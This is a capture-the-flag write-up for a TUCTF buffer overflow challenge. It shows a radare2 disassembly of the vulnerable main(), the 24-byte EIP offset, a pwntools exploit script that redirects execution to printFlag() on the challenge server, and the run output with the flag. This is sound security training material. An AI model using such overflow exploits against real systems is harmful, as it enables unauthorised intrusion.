### Solved by superkojiman

Simple buffer overflow, but the binary has NX. Here's what main() looks like:

```
[0x08048470]> pdf@sym.main
            ;-- main:
/ (fcn) sym.main 60
|           ; DATA XREF from 0x08048487 (sym.main)
|           0x080485c9      55             push ebp
|           0x080485ca      89e5           mov ebp, esp
|           0x080485cc      83e4f0         and esp, 0xfffffff0
|           0x080485cf      83ec20         sub esp, 0x20
|           0x080485d2      c70424ac8604.  mov dword [esp], str.This_program_is_hungry._You_should_feed_it. ; [0x80486ac:4]=0x73696854  LEA str.This_program_is_hungry._You_should_feed_it. ; "This program is hungry. You should feed it." @ 0x80486ac
|           0x080485d9      e842feffff     call sym.imp.puts
|           0x080485de      8d442414       lea eax, [esp + 0x14]       ; 0x14
|           0x080485e2      89442404       mov dword [esp + 4], eax
|           0x080485e6      c70424d88604.  mov dword [esp], 0x80486d8  ; [0x80486d8:4]=0x44007325
|           0x080485ed      e86efeffff     call sym.imp.__isoc99_scanf
|           0x080485f2      c70424db8604.  mov dword [esp], str.Do_you_feel_the_flow_ ; [0x80486db:4]=0x79206f44  LEA str.Do_you_feel_the_flow_ ; "Do you feel the flow?" @ 0x80486db
|           0x080485f9      e822feffff     call sym.imp.puts
|           0x080485fe      b800000000     mov eax, 0
|           0x08048603      c9             leave
\           0x08048604      c3             ret
```

EIP can be overwritten at offset 24 bytes. But where to return to? A function listing returned by radare shows a function called printFlag(). Easy enough. Here's the exploit:

```
#!/usr/bin/env python
from pwn import *

r = remote("146.148.95.248", 2525)

buf = ""
buf += "A"*24
buf += p32(0x0804856d)

open("in.txt", "w").write(buf)

print r.recv()
r.sendline(buf)
print r.recvall()
```

And here it is in action:

```python
# ./sploit.py
[+] Opening connection to 146.148.95.248 on port 2525: Done
This program is hungry. You should feed it.

[+] Recieving all data: Done (58B)
[*] Closed connection to 146.148.95.248 port 2525
Do you feel the flow?
TUCTF{jumping_all_around_dem_elfs}
```
